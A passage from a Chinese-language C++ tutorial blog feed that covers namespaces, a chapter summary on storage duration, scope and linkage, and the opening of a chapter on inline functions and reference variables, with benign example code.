提供了最大的灵活性，允许在运行时根据需要创建和销毁对象，但同时也带来了手动管理内存的责任，容易出错（如内存泄漏、悬挂指针）。后续章节将更详细地探讨动态内存管理，特别是与类结合使用时。</p><h2 id="9-3-名称空间"><a href="#9-3-名称空间" class="headerlink" title="9.3 名称空间"></a>9.3 名称空间</h2><p>随着项目越来越大，或者当你需要使用来自不同开发者的代码库时，可能会遇到一个问题：名称冲突。例如，你可能定义了一个名为 <code>List</code> 的类，而另一个库也定义了一个同名的 <code>List</code> 类。当你在同一个程序中使用这两个类时，编译器就无法区分你指的是哪个 <code>List</code>。</p><p>为了解决这个问题，C++引入了<strong>名称空间 (Namespace)</strong> 的概念。名称空间提供了一种将全局作用域划分为不同逻辑部分的方法，每个部分包含一组相关的名称（如变量、函数、类等）。</p><h3 id="9-3-1-传统的C-名称空间"><a href="#9-3-1-传统的C-名称空间" class="headerlink" title="9.3.1 传统的C++名称空间"></a>9.3.1 传统的C++名称空间</h3><p>在名称空间特性被引入之前，C++只有一个**全局名称空间 (Global Namespace)**。所有在任何函数、类或结构外部声明的名称都属于全局名称空间。大型项目中，这很容易导致名称冲突，特别是当包含多个第三方库时。</p><p>开发者有时会使用一些约定来模拟名称空间，例如给所有相关的名称添加特定的前缀（如 <code>mylib_List</code>），但这并不是一个完美的解决方案。</p><h3 id="9-3-2-新的名称空间特性"><a href="#9-3-2-新的名称空间特性" class="headerlink" title="9.3.2 新的名称空间特性"></a>9.3.2 新的名称空间特性</h3><p>C++标准引入了 <code>namespace</code> 关键字来显式地创建具名的名称空间。</p><p><strong>定义名称空间:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="comment">// 在这里声明和定义变量、函数、类等</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace mycode</span></span><br></pre></td></tr></table></figure><p><strong>访问名称空间成员:</strong></p><p>有三种主要方法可以访问名称空间中的成员：</p><ol><li><p><strong>作用域解析运算符 <code>::</code> (Scope Resolution Operator):</strong> 使用名称空间名称和 <code>::</code> 来限定成员名。这是最安全的方式，因为它明确指出了使用的是哪个名称空间的成员。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; mycode::value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>using</code> 声明 (Using Declaration):</strong> 使特定的名称空间成员可用，就像它是在当前作用域声明的一样。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">9.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> mycode::value; <span class="comment">// 只让 value 可用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 10 (直接访问)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; score &lt;&lt; std::endl; // 错误！score 未声明</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; mycode::score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 需要限定符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>using</code> 指令 (Using Directive):</strong> 使整个名称空间的所有成员都可用。这比较方便，但也可能重新引入名称冲突的问题，应谨慎使用，尤其是在头文件中。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">9.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 using 指令使 mycode 的所有成员可用</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> mycode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10 (直接访问)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 9.5 (直接访问)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong><code>std</code> 名称空间:</strong></p><p>C++标准库的所有组件（如 <code>cout</code>, <code>cin</code>, <code>string</code>, <code>vector</code> 等）都被定义在 <code>std</code> 名称空间中。这就是为什么我们通常需要写 <code>std::cout</code> 或者在文件开头使用 <code>using namespace std;</code> 或 <code>using std::cout;</code>。</p><p><strong>未命名的名称空间 (Unnamed Namespaces):</strong></p><p>你也可以创建未命名的名称空间。这类似于使用 <code>static</code> 关键字声明具有内部链接性的全局变量或函数。未命名名称空间中的成员只能在当前文件内访问。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="comment">// 这些成员只在当前文件可见</span></span><br><span class="line">    <span class="keyword">int</span> internal_count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        internal_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在同一文件中可以访问</span></span><br><span class="line"><span class="comment">// increment();</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; internal_count &lt;&lt; std::endl;</span></span><br></pre></td></tr></table></figure><h3 id="9-3-3-名称空间示例"><a href="#9-3-3-名称空间示例" class="headerlink" title="9.3.3 名称空间示例"></a>9.3.3 名称空间示例</h3><p>下面是一个更完整的示例，展示了如何定义和使用多个名称空间：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // std 命名空间中的 string 类</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个名称空间</span></span><br><span class="line"><span class="keyword">namespace</span> first_space &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside first_space&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个名称空间</span></span><br><span class="line"><span class="keyword">namespace</span> second_space &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside second_space&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用作用域解析运算符</span></span><br><span class="line">    first_space::display();  <span class="comment">// 输出: Inside first_space</span></span><br><span class="line">    second_space::display(); <span class="comment">// 输出: Inside second_space</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;first_space::count = &quot;</span> &lt;&lt; first_space::count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出: 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;second_space::count = &quot;</span> &lt;&lt; second_space::count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 using 声明</span></span><br><span class="line">    &#123; <span class="comment">// 创建一个新的作用域</span></span><br><span class="line">        <span class="keyword">using</span> first_space::display;</span><br><span class="line">        display(); <span class="comment">// 调用 first_space::display()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 using 指令 (通常建议在函数内部或特定作用域内使用)</span></span><br><span class="line">    &#123; <span class="comment">// 创建一个新的作用域</span></span><br><span class="line">        <span class="keyword">using</span> <span class="keyword">namespace</span> second_space;</span><br><span class="line">        display(); <span class="comment">// 调用 second_space::display()</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count from second_space = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 访问 second_space::count</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// std 命名空间的使用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello from std namespace!&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-3-4-名称空间及其前途"><a href="#9-3-4-名称空间及其前途" class="headerlink" title="9.3.4 名称空间及其前途"></a>9.3.4 名称空间及其前途</h3><p>名称空间是现代C++编程不可或缺的一部分。它们是组织代码、避免名称冲突以及管理大型项目复杂性的关键工具。</p><ul><li>  <strong>库开发:</strong> 几乎所有的现代C++库都将其组件放在一个或多个名称空间中，以防止与使用该库的代码或其他库发生冲突。<code>std</code> 是最典型的例子。</li><li>  <strong>项目组织:</strong> 在大型项目中，开发者经常使用名称空间来划分代码的不同模块或功能区域。</li><li>  <strong>避免全局污染:</strong> 使用名称空间可以减少全局作用域中的名称数量，使代码更清晰、更易于维护。</li></ul><p><strong>最佳实践:</strong></p><ol><li> **优先使用作用域解析运算符 (<code>::</code>)**：这是最明确、最不易出错的方式。</li><li> <strong>在 <code>.cpp</code> 文件或函数内部使用 <code>using</code> 声明或指令</strong>：避免在头文件（<code>.h</code> 或 <code>.hpp</code>）的顶层使用 <code>using</code> 指令，因为它会影响所有包含该头文件的文件，可能导致意想不到的名称冲突。</li><li> <strong>将自己的代码放入名称空间</strong>：这是一个良好的编程习惯，特别是当你编写可能被他人重用的代码时。</li></ol><p>理解和正确使用名称空间对于编写健壮、可维护的C++代码至关重要。</p><h2 id="9-4-总结"><a href="#9-4-总结" class="headerlink" title="9.4 总结"></a>9.4 总结</h2><p>本章探讨了C++如何管理程序中的内存和名称，特别是在涉及多个文件的大型项目中。这些机制对于编写结构清晰、可维护且可扩展的C++代码至关重要。</p><p>主要内容回顾：</p><ol><li><p> <strong>单独编译 (Separate Compilation):</strong> C++允许将程序分解为多个源文件（<code>.cpp</code>）和头文件（<code>.h</code> 或 <code>.hpp</code>）。源文件包含函数的具体实现或变量的定义，而头文件通常包含声明（如函数原型、类定义、常量声明、模板等）。每个源文件可以被独立编译成目标文件（<code>.obj</code> 或 <code>.o</code>），最后由链接器将这些目标文件以及所需的库文件组合成最终的可执行程序。这种方式提高了编译效率，并使得代码模块化和重用更加方便。</p></li><li><p><strong>存储持续性、作用域和链接性 (Storage Duration, Scope, and Linkage):</strong></p><ul><li>  <strong>存储持续性</strong>决定了变量或对象在内存中存在的时间。主要有：自动存储（函数内定义的局部变量，随函数调用创建和销毁）、静态存储（程序运行期间一直存在，如全局变量或用 <code>static</code> 修饰的变量）、线程存储（C++11引入，与特定线程生命周期相关）和动态存储（使用 <code>new</code> 分配，<code>delete</code> 释放）。</li><li>  <strong>作用域</strong>定义了程序中可以访问一个名称（变量、函数等）的区域。主要有：块作用域（<code>&#123;&#125;</code>内部）、函数作用域（仅用于 <code>goto</code> 标签）、函数原型作用域（仅用于参数名）、文件作用域（全局作用域）和类作用域。</li><li>  <strong>链接性</strong>决定了在不同文件或编译单元中声明的同名标识符是否指向同一个实体。主要有：外部链接（可在多个文件中共享，如普通全局变量和函数）、内部链接（仅在当前文件内可见，如用 <code>static</code> 修饰的全局变量/函数或未命名空间中的成员）和无链接（如局部变量）。<code>extern</code> 关键字可用于引用其他文件中具有外部链接的变量。</li></ul></li><li><p><strong>名称空间 (Namespaces):</strong> 为了解决大型项目中可能出现的名称冲突问题（例如，不同库定义了同名的函数或类），C++引入了名称空间。</p><ul><li>  使用 <code>namespace</code> 关键字可以创建具名的代码区域。</li><li>  访问名称空间成员可以通过作用域解析运算符 <code>::</code>（如 <code>std::cout</code>）、<code>using</code> 声明（如 <code>using std::cout;</code>）或 <code>using</code> 指令（如 <code>using namespace std;</code>）。</li><li>  C++标准库的所有功能都位于 <code>std</code> 名称空间中。</li><li>  未命名的名称空间提供了一种创建具有内部链接性的实体的方法，是替代文件作用域 <code>static</code> 的现代方式。</li></ul></li></ol><p>掌握这些概念有助于更好地组织代码，理解变量和函数的生命周期与可见性，并有效避免名称冲突，从而构建更健壮、更模块化的C++应用程序。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 8 函数进阶</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_8/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_8/</url>
      
        <content type="html"><![CDATA[<h2 id="8-1-C-内联函数"><a href="#8-1-C-内联函数" class="headerlink" title="8.1 C++ 内联函数"></a>8.1 C++ 内联函数</h2><p>常规的函数调用过程涉及一些开销：程序需要跳转到函数的内存地址，保存当前执行状态（如寄存器值），将参数复制到栈上，执行函数代码，存储返回值，恢复执行状态，然后跳转回调用点。对于非常短小且频繁调用的函数，这些开销可能会变得显著，影响程序性能。</p><p><strong>内联函数 (Inline Function)</strong> 是 C++ 提供的一种优化机制，旨在减少这种函数调用开销。其基本思想是：建议编译器在<strong>编译时</strong>将函数的实际代码直接<strong>替换</strong>到每个调用该函数的地方，而不是执行常规的函数调用跳转。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>要建议编译器将一个函数视为内联函数，可以在函数定义前加上 <code>inline</code> 关键字。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个简单的内联函数</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用内联函数</span></span><br><span class="line">    b = square(a); <span class="comment">// 编译器可能会将这里替换为: b = a * a;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, a squared = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> c = square(<span class="number">1.5</span> + <span class="number">2.5</span>); <span class="comment">// 编译器可能会替换为: double c = (1.5 + 2.5) * (1.5 + 2.5);</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(1.5 + 2.5) squared = &quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ul><li>  <code>square</code> 函数被声明为 <code>inline</code>。</li><li>  在 <code>main</code> 函数中调用 <code>square(a)</code> 时，编译器<strong>可能</strong>会直接用 <code>a * a</code> 的代码替换这次调用，避免了函数调用的开销。</li><li>  同样，<code>square(1.5 + 2.5)</code> 可能被替换为 <code>(1.5 + 2.5) * (1.5 + 2.5)</code>。</li></ul><h3 id="inline-的特性和注意事项"><a href="#inline-的特性和注意事项" class="headerlink" title="inline 的特性和注意事项"></a><code>inline</code> 的特性和注意事项</h3><ol><li><p> <strong>建议而非命令:</strong> <code>inline</code> 关键字只是向编译器提出的一个<strong>建议</strong>。编译器会根据自己的优化策略来决定是否真的进行内联。如果函数体过于复杂（例如包含循环、递归、大量代码），或者编译器认为内联不会带来好处（甚至可能有害），它可能会忽略 <code>inline</code> 建议，仍然执行常规的函数调用。</p></li><li><p> <strong>适用于小型函数:</strong> 内联最适合那些代码量小、执行速度快且被频繁调用的函数。如果内联一个大函数，可能会导致最终生成的可执行代码体积显著增大（代码膨胀），反而降低性能（因为更大的代码可能导致更多的缓存未命中）。</p></li><li><p><strong>定义位置:</strong> 为了让编译器能够在调用点展开函数代码，内联函数的<strong>定义</strong>（而不仅仅是原型）通常需要放在调用该函数的每个源文件中。最常见的做法是将内联函数的定义直接放在<strong>头文件</strong>中。这样，包含该头文件的所有源文件都能看到完整的函数定义，编译器就有机会进行内联。</p><ul><li>  注意：将函数定义放在头文件中对于非内联函数通常是错误的（会导致链接错误，因为同一个函数会在多个编译单元中定义），但对于内联函数是允许且必要的。</li></ul></li><li><p><strong>类定义中的函数:</strong> 在类（<code>class</code> 或 <code>struct</code>）定义内部实现的成员函数<strong>默认</strong>就是内联的，不需要显式添加 <code>inline</code> 关键字。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> value; &#125; <span class="comment">// 默认是内联的</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h3 id="内联函数-vs-宏-define"><a href="#内联函数-vs-宏-define" class="headerlink" title="内联函数 vs. 宏 (#define)"></a>内联函数 vs. 宏 (<code>#define</code>)</h3><p>在 C 语言中，有时会使用带参数的宏（<code>#define</code>）来模拟类似内联函数的效果，以避免函数调用开销。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SQUARE(X) ((X)*(X)) <span class="comment">// C 风格宏</span></span></span><br></pre></td></tr></table></figure><p>然而，宏存在一些缺点：</p><ul><li>  <strong>类型不安全:</strong> 宏只是简单的文本替换，不进行类型检查。</li><li>  <strong>意外的副作用:</strong> 如果参数带有副作用（如 <code>SQUARE(i++)</code>），可能会导致意想不到的结果，因为参数会被多次求值 (<code>((i++)*(i++))</code>）。</li><li>  <strong>调试困难:</strong> 宏在预处理阶段就被替换掉了，调试器通常看不到宏的原始形式。</li><li>  <strong>作用域问题:</strong> 宏不受 C++ 的作用域规则约束。</li></ul><p>内联函数克服了这些缺点：</p><ul><li>  <strong>类型安全:</strong> 内联函数遵循正常的函数类型检查规则。</li><li>  <strong>参数求值:</strong> 参数只会被求值一次。</li><li>  <strong>可调试:</strong> 内联函数仍然是真正的函数，可以用调试器进行调试（尽管内联后的代码可能看起来不同）。</li><li>  <strong>遵循作用域:</strong> 内联函数遵循 C++ 的作用域和访问规则。</li></ul><p>因此，在 C++ 中，应优先使用内联函数而不是带参数的宏来实现简单的、需要避免调用开销的功能。</p><p><strong>总结:</strong></p><p>内联函数是 C++ 提供的一种性能优化建议，通过在编译时将函数代码替换到调用点来减少函数调用开销。它特别适用于短小且频繁调用的函数。<code>inline</code> 关键字只是一个建议，编译器有最终决定权。为了使内联成为可能，通常需要将内联函数的定义放在头文件中。相比 C 风格的宏，内联函数提供了类型安全和更可预测的行为。</p><h2 id="8-2-引用变量"><a href="#8-2-引用变量" class="headerlink" title="8.2 引用变量"></a>8.2 引用变量</h2><p>C++ 引入了一种新的复合类型——<strong>引用 (Reference)**。引用是已定义变量的</strong>别名 (alias)**。它提供了一种间接访问变量的方式，但语法比指针更简洁。一旦引用被初始化指向一个变量，它就不能再引用其他变量，并且对引用的所有操作实际上都作用于它所引用的原始变量。</p><h3 id="8-2-1-创建引用变量"><a href="#8-2-1-创建引用变量" class="headerlink" title="8.2.1 创建引用变量"></a>8.2.1 创建引用变量</h3><p>引用变量在声明时必须被初始化，并且其类型必须与它所引用的变量类型相匹配。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&amp; reference_name = existing_variable;</span><br></pre></td></tr></table></figure><ul><li>  <code>type</code>: 变量的类型。</li><li>  <code>&amp;</code>: 引用声明符，紧跟在类型名之后。</li><li>  <code>reference_name</code>: 引用的名称。</li><li>  <code>existing_variable</code>: 引用所指向的已存在的变量。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rats = <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">int</span>&amp; rodents = rats; <span class="comment">// rodents 是 rats 的一个引用 (别名)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rats = &quot;</span> &lt;&lt; rats;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, rodents = &quot;</span> &lt;&lt; rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: rats = 101, rodents = 101</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对引用进行操作，实际上是操作原始变量</span></span><br><span class="line">    rodents++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After rodents++:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rats = &quot;</span> &lt;&lt; rats; <span class="comment">// rats 的值也变成了 102</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, rodents = &quot;</span> &lt;&lt; rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: rats = 102, rodents = 